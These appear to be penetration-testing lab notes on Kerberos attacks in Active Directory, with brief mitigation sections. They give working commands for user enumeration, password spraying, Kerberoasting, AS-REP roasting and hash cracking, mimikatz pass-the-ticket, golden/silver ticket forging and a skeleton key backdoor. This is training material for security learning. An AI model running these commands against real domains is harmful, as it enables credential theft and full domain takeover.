# Kerberos

- Common Terminology
    - **Ticket Granting Ticket (TGT)** - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
    - **Key Distribution Center (KDC)** - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
    - **Authentication Service (AS)** - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
    - **Ticket Granting Service (TGS)** - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
    - **Service Principal Name (SPN)** - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
    - **KDC Long Term Secret Key (KDC LT Key)** The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
    - **Client Long Term Secret Key (Client LT Key)** The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
    - **Service Long Term Secret Key (Service LT Key)** The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
    - **Session Key** - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
    - **Privilege Attribute Certificate (PAC)** - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.
- Kerbrute Installation
    
    1.) Download a precompiled binary for your OS - [https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)
    
    2.) Rename kerbrute_linux_amd64 to kerbrute
    
    3.) `chmod +x kerbrute` - make kerbrute executable
    

# Method 1

- Enumerating Users w/ Kerbrute
    
    Enumerating users allows you to know which user accounts are on the target domain and which accounts could potentially be used to access the network.
    
    1.) cd into the directory that you put Kerbrute
    
    2.) Download the wordlist to enumerate with [here](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt)
    
    3.) `./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt` - This will brute force user accounts from a domain controller using a supplied wordlist
    
    `./kerbrute userenum --dc 10.129.40.46 -d manager.htb /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt`
    
    ![https://i.imgur.com/fSDrhyb.png](https://i.imgur.com/fSDrhyb.png)
    
- Enumerating Users w/ netexec
    
    `netexec smb 10.129.40.46 -u 'guest' -p '' --rid-brute`
    
    ![Untitled](Kerberos%2019e1fb7cfcae407ea4abfedc45f563d7/Untitled.png)
    
- Harvesting Tickets w/ Rubeus
    
    Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.
    
    1.) `cd Downloads` - navigate to the directory Rubeus is in
    
    2.) `Rubeus.exe harvest /interval:30` - This command tells Rubeus to harvest for TGTs every 30 seconds
    
    ![https://i.imgur.com/VCeyyn9.png](https://i.imgur.com/VCeyyn9.png)
    
- Brute-Forcing / Password-Spraying w/ Rubeus
    
    `echo MACHINE_IP CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`
    
    1.) `cd Downloads` - navigate to the directory Rubeus is in
    
    2.) `Rubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user
    
    ![https://i.imgur.com/WN4zVo5.png](https://i.imgur.com/WN4zVo5.png)
    
- Kerberoasting w/ Rubeus
    
    1.) `cd Downloads` - navigate to the directory Rubeus is in
    
    2.) `Rubeus.exe kerberoast` This will dump the Kerberos hash of any kerberoastable users
    
    ![https://i.imgur.com/XZegVqf.png](https://i.imgur.com/XZegVqf.png)
    
    copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat
    
    I have created a modified rockyou wordlist in order to speed up the process download it [here](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt)
    
    3.) `hashcat -m 13100 -a 0 hash.txt Pass.txt` - now crack that hash
    

# Method 2 - Impacket

- Impacket Installation
    
    Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20
    
    1.) `cd /opt` navigate to your preferred directory to save tools in
    
    2.) download the precompiled package from [https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19)
    
    3.) `cd Impacket-0.9.19` navigate to the impacket directory
    
    4.) `pip install .` - this will install all needed dependencies
    
- Kerberoasting w/ Impacket
    
    1.) `cd /usr/share/doc/python3-impacket/examples/` - navigate to where GetUserSPNs.py is located
    
    2.) `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request` - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.
    
    3.) `hashcat -m 13100 -a 0 hash.txt Pass.txt` - now crack that hash
    
- Dumping KRBASREP5 Hashes w/ Rubeus
    
    1.) `cd Downloads` - navigate to the directory Rubeus is in
    
    2.) `Rubeus.exe asreproast` - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
    
    ![https://i.imgur.com/l3wJhby.png](https://i.imgur.com/l3wJhby.png)
    
- Crack those Hashes w/ hashcat
    
    1.) Transfer the hash from the target machine over to your attacker machine and put the hash into a txt file
    
    2.) Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....
    
    Use the same wordlist that you downloaded in task 4
    
    3.) `hashcat -m 18200 hash.txt Pass.txt` - crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200
    
    ![https://i.imgur.com/eOqGVrm.png](https://i.imgur.com/eOqGVrm.png)
    

# AS-REP Roasting Mitigations

- Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
- Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.

# Pass the Ticket

- Prepare Mimikatz & Dump Tickets
    
    You will need to run the command prompt as an administrator: use the same credentials as you did to get into the machine. If you don't have an elevated command prompt mimikatz will not work properly.
    
    1.) `cd Downloads` - navigate to the directory mimikatz is in
    
    2.) `mimikatz.exe` - run mimikatz
    
    3.) `privilege::debug` - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
    
    ![https://i.imgur.com/SJQGplV.png](https://i.imgur.com/SJQGplV.png)
    
    4.) `sekurlsa::tickets /export` - this will export all of the .kirbi tickets into the directory that you are currently in
    
    At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier
    
    ![https://i.imgur.com/xC0L5Kf.png](https://i.imgur.com/xC0L5Kf.png)
    
    When looking for which ticket to impersonate I would recommend looking for an administrator ticket from the krbtgt just like the one outlined in red above.
    
- Pass the Ticket w/ Mimikatz
    
    Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.
    
    1.) `kerberos::ptt <ticket>` - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket
    
    ![https://i.imgur.com/DwXmm8Z.png](https://i.imgur.com/DwXmm8Z.png)
    
    2.) `klist` - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.
    
    We will not be using mimikatz for the rest of the attack.
    
    ![https://i.imgur.com/GgxDm9k.png](https://i.imgur.com/GgxDm9k.png)
    
    3.) You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.
    
    ![https://i.imgur.com/9nxjeTS.png](https://i.imgur.com/9nxjeTS.png)
    
    Note that this is only a POC to understand how to pass the ticket and gain domain admin the way that you approach passing the ticket may be different based on what kind of engagement you're in so do not take this as a definitive guide of how to run this attack.
    

# Pass the Ticket Mitigation

Let's talk blue team and how to mitigate these types of attacks.

- Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.

# Dump the krbtgt hash

- Dump the krbtgt hash
    
    1.) `cd downloads && mimikatz.exe` - navigate to the directory mimikatz is in and run mimikatz
    
    2.) `privilege::debug` - ensure this outputs [privilege '20' ok]
    
    3.) `lsadump::lsa /inject /name:krbtgt` - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
    
    ![https://i.imgur.com/VOEsU4O.png](https://i.imgur.com/VOEsU4O.png)
    
- Create a Golden/Silver Ticket
    
    1.) `Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:` - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
    
    I'll show you a demo of creating a golden ticket it is up to you to create a silver ticket.
    
    ![https://i.imgur.com/rh06qDl.png](https://i.imgur.com/rh06qDl.png)
    
- Use the Golden/Silver Ticket to access other machines
    
    1.) `misc::cmd` - this will open a new elevated command prompt with the given ticket in mimikatz.
    
    ![https://i.imgur.com/6HnEnwi.png](https://i.imgur.com/6HnEnwi.png)
    
    2.) Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
    
    ![https://i.imgur.com/BSh4rXy.png](https://i.imgur.com/BSh4rXy.png)
    

# Skeleton Key Overview

![https://i.imgur.com/yNI0zEb.png](https://i.imgur.com/yNI0zEb.png)

- Preparing Mimikatz
    
    1.) `cd Downloads && mimikatz.exe` - Navigate to the directory mimikatz is in and run mimikatz
    
    2.) `privilege::debug` - This should be a standard for running mimikatz as mimikatz needs local administrator access
    
    ![https://i.imgur.com/ZPOMDMo.png](https://i.imgur.com/ZPOMDMo.png)
    
- Installing the Skeleton Key w/ mimikatz
    
    1.) `misc::skeleton` - Yes! that's it but don't underestimate this small command it is very powerful
    
    ![https://i.imgur.com/wI802gw.png](https://i.imgur.com/wI802gw.png)
    
- Accessing the forest
    
    The default credentials will be: "*mimikatz*"
    
    example: `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz` - The share will now be accessible without the need for the Administrators password
    
    example: `dir \\Desktop-1\c$ /user:Machine1 mimikatz` - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1
    
    The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.